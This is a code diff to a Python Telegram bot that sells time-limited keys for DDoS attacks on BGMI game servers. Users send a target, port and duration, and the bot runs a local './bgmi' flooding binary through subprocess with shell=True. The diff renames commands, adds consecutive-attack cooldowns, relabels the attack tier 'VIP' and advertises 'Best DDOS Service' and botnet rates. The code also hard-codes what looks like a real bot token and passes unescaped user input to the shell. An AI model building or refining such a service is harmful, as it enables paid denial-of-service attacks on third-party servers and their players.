@@ -5,6 +5,7 @@ import os
 import random
 import string
 import json
+import time
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('6606080506:AAH9AXgoT3hFf1Rbx39nDoZClIg4vV-e0uw')
@@ -12,20 +13,27 @@ bot = telebot.TeleBot('6606080506:AAH9AXgoT3hFf1Rbx39nDoZClIg4vV-e0uw')
 # Admin user IDs
 admin_id = {"881808734"}
 
-# File to store allowed user IDs and expiration dates
+# Files for data storage
 USER_FILE = "users.json"
-
-# File to store command logs
 LOG_FILE = "log.txt"
-
-# File to store keys
 KEY_FILE = "keys.json"
 
-# Cooldown time for users
-COOLDOWN_TIME = 240  # 4 minutes
+# Cooldown settings
+COOLDOWN_TIME = 0  # in seconds
+CONSECUTIVE_ATTACKS_LIMIT = 2
+CONSECUTIVE_ATTACKS_COOLDOWN = 240  # in seconds
 
-# Dictionary to store the last time each user ran the /bgmi command
+# In-memory storage
+users = {}
+keys = {}
 bgmi_cooldown = {}
+consecutive_attacks = {}
+
+# Read users and keys from files initially
+def load_data():
+    global users, keys
+    users = read_users()
+    keys = read_keys()
 
 def read_users():
     try:
@@ -34,7 +42,7 @@ def read_users():
     except FileNotFoundError:
         return {}
 
-def save_users(users):
+def save_users():
     with open(USER_FILE, "w") as file:
         json.dump(users, file)
 
@@ -45,7 +53,7 @@ def read_keys():
     except FileNotFoundError:
         return {}
 
-def save_keys(keys):
+def save_keys():
     with open(KEY_FILE, "w") as file:
         json.dump(keys, file)
 
@@ -53,20 +61,19 @@ def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
     username = user_info.username if user_info.username else f"UserID: {user_id}"
 
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+    with open(LOG_FILE, "a") as file:
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
 def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
-                response = "Logs are already cleared. No data found."
+                return "Logs are already cleared. No data found."
             else:
                 file.truncate(0)
-                response = "🗑️Logs cleared successfully ✅"
+                return "🗑️Logs cleared successfully ✅"
     except FileNotFoundError:
-        response = "No logs found to clear."
-    return response
+        return "No logs found to clear."
 
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
@@ -87,7 +94,7 @@ def generate_key(length=6):
 def add_time_to_current_date(hours=0, days=0):
     return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
 
-@bot.message_handler(commands=['generatekey'])
+@bot.message_handler(commands=['gen'])
 def generate_key_command(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
@@ -103,81 +110,99 @@ def generate_key_command(message):
                 else:
                     raise ValueError("Invalid time unit")
                 key = generate_key()
-                keys = read_keys()
                 keys[key] = expiration_date
-                save_keys(keys)
+                save_keys()
                 response = f"Key generated: {key}\nExpires on: {expiration_date}"
             except ValueError:
                 response = "Please specify a valid number and unit of time (hours/days)."
         else:
-            response = "Usage: /generatekey <amount> <hours/days>"
+            response = "Usage: /gen <amount> <hours/days>"
     else:
         response = "🫅ONLY OWNER CAN USE🫅"
 
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['redeemkey'])
+@bot.message_handler(commands=['redeem'])
 def redeem_key_command(message):
     user_id = str(message.chat.id)
     command = message.text.split()
     if len(command) == 2:
         key = command[1]
-        keys = read_keys()
         if key in keys:
             expiration_date = keys[key]
-            users = read_users()
             if user_id in users:
                 user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                 new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                 users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
             else:
                 users[user_id] = expiration_date
-            save_users(users)
+            save_users()
             del keys[key]
-            save_keys(keys)
+            save_keys()
             response = f"✅Key redeemed successfully! Access granted until: {users[user_id]}"
         else:
             response = "Invalid or expired key."
     else:
-        response = "Usage: /redeemkey <key>"
+        response = "Usage: /redeem <key>"
 
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
-    users = read_users()
+    
     if user_id in users:
         expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-        if datetime.datetime.now() <= expiration_date:
-            if user_id not in admin_id:
-                if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                    response = f"You are on cooldown. Please wait {COOLDOWN_TIME // 240} 4minutes before running the /bgmi command again."
+        if datetime.datetime.now() > expiration_date:
+            response = "❌ Access Chala Gaya Dost. Naya Key Redeem Karle-> using /redeem <key> ❌"
+            bot.reply_to(message, response)
+            return
+        
+        if user_id not in admin_id:
+            if user_id in bgmi_cooldown:
+                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
+                if time_since_last_attack < COOLDOWN_TIME:
+                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
+                    response = f"Wait Karle Bhai {cooldown_remaining} seconds Baad  /bgmi Use Kariyo."
                     bot.reply_to(message, response)
                     return
-                bgmi_cooldown[user_id] = datetime.datetime.now()
-
-            command = message.text.split()
-            if len(command) == 4:
-                target = command[1]
-                try:
-                    port = int(command[2])
-                    time = int(command[3])
-                    if time > 240:
-                        response = "⚠️Error: Time interval must be less than 240 seconds."
+                
+                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
+                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
+                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
+                        response = f"Wait Karle Bhai {cooldown_remaining} seconds baad /bgmi command use karna."
+                        bot.reply_to(message, response)
+                        return
                     else:
-                        record_command_logs(user_id, '/bgmi', target, port, time)
-                        log_command(user_id, target, port, time)
-                        start_attack_reply(message, target, port, time)
-                        full_command = f"./bgmi {target} {port} {time} 360"
-                        subprocess.run(full_command, shell=True)
-                        response = f"🎮BGMI Attack Finished🎮 Target: {target} Port: {port} Time: {time}"
-                except ValueError:
-                    response = "Error: Port and time must be integers."
-            else:
-                response = "✅Usage: /bgmi <target> <port> <time>"
+                        consecutive_attacks[user_id] = 0
+
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1
+
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            try:
+                port = int(command[2])
+                time = int(command[3])
+                if time > 190:
+                    response = "⚠️Error: Time interval must be less than 190 seconds."
+                else:
+                    record_command_logs(user_id, '/bgmi', target, port, time)
+                    log_command(user_id, target, port, time)
+                    start_attack_reply(message, target, port, time)
+                    full_command = f"./bgmi {target} {port} {time} 320"
+                    try:
+                        subprocess.run(full_command, shell=True, check=True)
+                    except subprocess.CalledProcessError as e:
+                        response = f"Error running subprocess: {str(e)}"
+                        bot.reply_to(message, response)
+                        return
+                    response = f"🎮BGMI FUCKED🎮\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
+            except ValueError:
+                response = "Error: Port and time must be integers."
         else:
-            response = "❌Your access has expired. Please redeem a new key❌"
+            response = "✅Usage: /bgmi <target> <port> <time>"
     else:
         response = "🚫You are not authorized to use this command🚫"
 
@@ -186,7 +211,7 @@ def handle_bgmi(message):
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    response = f"{username}, 🔥🔥ATTACK STARTED.🔥🔥\n\n🎯Target: {target}\n🚪Port: {port}\n⏳Time: {time} Seconds\nMethod: BGMI-FREE\n By ZAHER"
+    response = f"{username}, 🔥🔥ATTACK STARTED.🔥🔥\n\n🎯Target: {target}\n🚪Port: {port}\n⏳Time: {time} Seconds\nMethod: BGMI-VIP\nBy ZAHER"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['clearlogs'])
@@ -202,15 +227,14 @@ def clear_logs_command(message):
 def show_all_users(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        users = read_users()
         if users:
             response = "Authorized Users:\n"
             for user_id, expiration_date in users.items():
                 try:
                     user_info = bot.get_chat(int(user_id))
-                    username = user_info.username
+                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                     response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
-                except Exception as e:
+                except Exception:
                     response += f"- User ID: {user_id} expires on {expiration_date}\n"
         else:
             response = "No data found"
@@ -239,13 +263,13 @@ def show_recent_logs(message):
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
     user_id = str(message.chat.id)
-    response= f"🤖Your ID: {user_id}"
+    response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
-    if user_id in read_users():
+    if user_id in users:
         try:
             with open(LOG_FILE, "r") as file:
                 command_logs = file.readlines()
@@ -264,14 +288,14 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''🤖 Available commands:
-💥 /bgmi <target> <port> <time>: Method for BGMI servers. 
+💥 /bgmi <target> <port> <time>: Method for BGMI servers.
 💥 /rules: Please check before use.
 💥 /mylogs: To check your recent attacks.
 💥 /plan: Checkout our botnet rates.
-💥 /redeemkey <key>: Redeem a key for access.
+💥 /redeem <key>: Redeem a key for access.
 
 🤖 Admin commands:
-💥 /generatekey <amount> <hours/days>: Generate a new key.
+💥 /gen <amount> <hours/days>: Generate a new key.
 💥 /allusers: List authorized users.
 💥 /logs: Show all users' logs.
 💥 /clearlogs: Clear the logs file.
@@ -282,8 +306,8 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to your home, {user_name}! Feel free to explore.
-🤖Try running this command: /help 
+    response = f'''👋🏻Welcome Premium Bot, {user_name}! Best DDOS Service.
+🤖Try running this command: /help
 '''
     bot.reply_to(message, response)
 
@@ -293,7 +317,7 @@ def welcome_rules(message):
     response = f'''{user_name}, please follow these rules ⚠️:
 
 1. Don't run too many attacks to avoid a ban from the bot.
-2. Don't run 2 attacks at the same time to avoid a ban from the bot. 
+2. Don't run 2 attacks at the same time to avoid a ban from the bot.
 3. We check the logs daily, so follow these rules to avoid a ban!
 '''
     bot.reply_to(message, response)
@@ -321,7 +345,7 @@ def admin_commands(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, here are the admin commands:
 
-💥 /generatekey <amount> <hours/days>: Generate a new key.
+💥 /gen <amount> <hours/days>: Generate a new key.
 💥 /allusers: List authorized users.
 💥 /logs: Show all users' logs.
 💥 /clearlogs: Clear the logs file.
@@ -336,10 +360,9 @@ def remove_user(message):
         command = message.text.split()
         if len(command) == 2:
             target_user_id = command[1]
-            users = read_users()
             if target_user_id in users:
                 del users[target_user_id]
-                save_users(users)
+                save_users()
                 response = f"User {target_user_id} removed successfully."
             else:
                 response = "User not found."
@@ -357,7 +380,6 @@ def broadcast_message(message):
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
             message_to_broadcast = "⚠️ Message to all users by Admin:\n\n" + command[1]
-            users = read_users()
             for user_id in users:
                 try:
                     bot.send_message(user_id, message_to_broadcast)
@@ -371,9 +393,12 @@ def broadcast_message(message):
 
     bot.reply_to(message, response)
 
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
-
+if __name__ == "__main__":
+    load_data()
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            print(f"Exception occurred: {str(e)}")
+            # Wait a bit before restarting the polling to avoid tight loop in case of persistent errors
+            time.sleep(15)
